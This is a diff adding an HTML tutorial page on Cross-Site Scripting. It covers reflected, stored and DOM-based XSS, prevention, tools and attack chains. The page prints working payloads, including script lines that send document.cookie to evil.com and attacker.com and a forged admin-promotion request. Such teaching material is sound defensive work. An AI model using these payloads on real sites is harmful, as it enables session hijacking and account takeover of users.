@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Cross-Site Scripting (XSS)</title>
+  <link rel="stylesheet" href="https://myfirstorlastname.github.io/whoami/style.css" />
+</head>
+<body>
+  <div id="toc-container"></div>
+
+  <h1>🧪 Cross-Site Scripting (XSS)</h1>
+  <blockquote>Web is the front door to the internet. Know how to open it… or break it.</blockquote>
+  <hr>
+
+  <h2>🧠 About</h2>
+  <p>
+    Cross-Site Scripting (XSS) is a client-side vulnerability that allows an attacker to inject malicious scripts into trusted web applications. 
+    These scripts are then executed in the context of the victim's browser, leading to session hijacking, data theft, phishing, or full account takeover.
+  </p>
+
+  <h2>🌐 What is XSS?</h2>
+  <p>
+    XSS occurs when a web application includes untrusted data in a web page without proper validation or escaping. 
+    It targets the user’s browser rather than the server and is one of the most common vulnerabilities in web applications.
+  </p>
+
+  <h2>🧨 Types of XSS</h2>
+  <table>
+    <thead>
+      <tr><th>Type</th><th>Description</th></tr>
+    </thead>
+    <tbody>
+      <tr><td><strong>Reflected</strong></td><td>Payload is in the URL or request and immediately reflected into the response. Often used in phishing.</td></tr>
+      <tr><td><strong>Stored</strong></td><td>Payload is permanently stored on the server (e.g. comment field), and served to all users.</td></tr>
+      <tr><td><strong>DOM-Based</strong></td><td>Payload is processed by the browser-side JavaScript and never reaches the server.</td></tr>
+    </tbody>
+  </table>
+
+  <div class="takeaway-box">
+    <h3>🧠 Key Takeaways</h3>
+    <ul>
+      <li>XSS targets the user's browser, not the server directly.</li>
+      <li>It can be exploited to steal cookies, bypass CSRF protections, or modify the DOM.</li>
+      <li>Always encode output, validate input, and use modern frameworks with safe templating.</li>
+    </ul>
+  </div>
+
+  <div class="tips-box">
+    <h3>🔧 Testing Tips</h3>
+    <ul>
+      <li>Use <code><script>alert(1)</script></code> to test basic injection points.</li>
+      <li>Try <code><img src=x onerror=alert(1)></code> for HTML injection.</li>
+      <li>Use Burp Suite's XSS cheat sheets and the Repeater tab to fuzz parameters.</li>
+      <li>For DOM XSS, inspect JavaScript and monitor how <code>location.hash</code>, <code>document.URL</code>, or <code>innerHTML</code> are used.</li>
+    </ul>
+  </div>
+
+  <h2>💥 Practical Examples</h2>
+
+  <h3>1. Reflected XSS (GET parameter)</h3>
+  <p>URL:</p>
+  <pre><code>https://example.com/search?query=&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
+  <p>If the page outputs <code>query</code> directly in the HTML without encoding, the script executes in the victim's browser.</p>
+
+  <h3>2. Stored XSS (Comment Field)</h3>
+  <p>If an attacker posts this in a comment field:</p>
+  <pre><code>&lt;script&gt;document.location='http://evil.com/steal?cookie='+document.cookie&lt;/script&gt;</code></pre>
+  <p>Every user who views that comment will unknowingly execute the script.</p>
+
+  <h3>3. DOM-Based XSS (JavaScript Injection)</h3>
+  <pre><code>
+// Page JS:
+var name = location.hash.substring(1);
+document.getElementById("welcome").innerHTML = "Hello " + name;
+  </code></pre>
+  <p>URL:</p>
+  <pre><code>https://example.com/#&lt;img src=x onerror=alert(1)&gt;</code></pre>
+  <p>The attacker controls the DOM directly through the URL hash.</p>
+
+  <h2>🔒 Prevention Techniques</h2>
+  <ul>
+    <li>Escape output: Use context-aware escaping (HTML, JS, URL).</li>
+    <li>Use CSP (Content Security Policy) to reduce impact of successful XSS.</li>
+    <li>Validate and sanitize input on both client and server side.</li>
+    <li>Avoid using <code>innerHTML</code> or dangerous sinks directly.</li>
+    <li>Use security libraries (e.g. DOMPurify) to clean user-generated content.</li>
+  </ul>
+
+  <h2>🛠️ Tools</h2>
+  <ul>
+    <li>Burp Suite (with XSS extensions)</li>
+    <li>XSStrike</li>
+    <li>Dalfox</li>
+    <li>XSS Hunter (for stored XSS detection)</li>
+    <li>Browser dev tools for DOM inspection</li>
+  </ul>
+
+  <h2>🧪 Example Payloads to Try</h2>
+  <pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
+  <pre><code>&lt;img src=x onerror=alert(1)&gt;</code></pre>
+  <pre><code>&lt;svg onload=alert(1)&gt;</code></pre>
+  <pre><code>"&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre>
+  <pre><code>&lt;body onload=alert(1)&gt;</code></pre>
+
+  <h2>🧬 XSS in Real-World Attack Chains</h2>
+  <p>
+    While often seen as a “minor” bug, Cross-Site Scripting can be a powerful entry point — especially when chained with other vulnerabilities. In modern attacks and Red Team operations, XSS is used to <strong>escalate access, extract credentials, or pivot to internal systems</strong>.
+  </p>
+  
+  <h3>Session Hijacking & Account Takeover</h3>
+  <p>
+    A well-placed XSS payload in a cookie or localStorage context can capture authentication tokens:
+  </p>
+  <pre><code>fetch("https://attacker.com/log?cookie=" + document.cookie)</code></pre>
+  <p>
+    This enables attackers to hijack sessions, impersonate users, or even steal JWTs or OAuth tokens depending on how the application is architected.
+  </p>
+  
+  <h3>CSRF Bypass and Privilege Escalation</h3>
+  <p>
+    With control over JavaScript execution, XSS can silently forge authenticated requests (CSRF) to escalate privileges, change email addresses, or enable debug features on behalf of the victim.
+  </p>
+  <pre><code>
+  fetch("/admin/promote?user=attacker", { credentials: "include", method: "POST" });
+  </code></pre>
+  
+  <h3>Internal Recon and SSRF</h3>
+  <p>
+    In some configurations (e.g. when XSS executes in an admin panel or internal tool), the payload can:
+  </p>
+  <ul>
+    <li>Perform HTTP requests to internal services (<code>http://localhost:8080</code>)</li>
+    <li>Trigger SSRF-like behavior through the victim's browser</li>
+    <li>Interact with internal APIs, intranet dashboards, or cloud metadata endpoints</li>
+  </ul>
+  
+  <h3>DOM-Based Pivoting & Keylogging</h3>
+  <p>
+    Advanced payloads allow DOM manipulation or interaction recording:
+  </p>
+  <ul>
+    <li>Modify UI elements (e.g. change banking recipient addresses)</li>
+    <li>Capture keystrokes and user interactions</li>
+    <li>Install fake login overlays or steal 2FA tokens if sent over insecure channels</li>
+  </ul>
+  
+  <h3>From XSS to Shell</h3>
+  <p>
+    In rare but critical cases (e.g. when XSS runs in an admin panel with file upload), the chain continues:
+  </p>
+  <ul>
+    <li>Upload a web shell via admin functionality</li>
+    <li>Modify scripts or settings leading to Remote Code Execution (RCE)</li>
+    <li>Escalate from web access to backend control or system compromise</li>
+  </ul>
+  
+  <div class="takeaway-box">
+    <h3>🛠️ Key Mindset</h3>
+    <ul>
+      <li>XSS is not just alert boxes — it's a stepping stone.</li>
+      <li>Consider the context: who executes the payload, what access they have, and what features are exposed.</li>
+      <li>Think like an attacker: "What can I reach through their browser?"</li>
+    </ul>
+  </div>
+
+  <hr />
+
+  <footer>
+    Web hacking is a discipline of logic, curiosity, and precision. Learn how the web works, then learn how to make it work for you.
+  </footer>
+  <script src="https://myfirstorlastname.github.io/whoami/call_for_toc.js"></script>
+</body>
+</html>
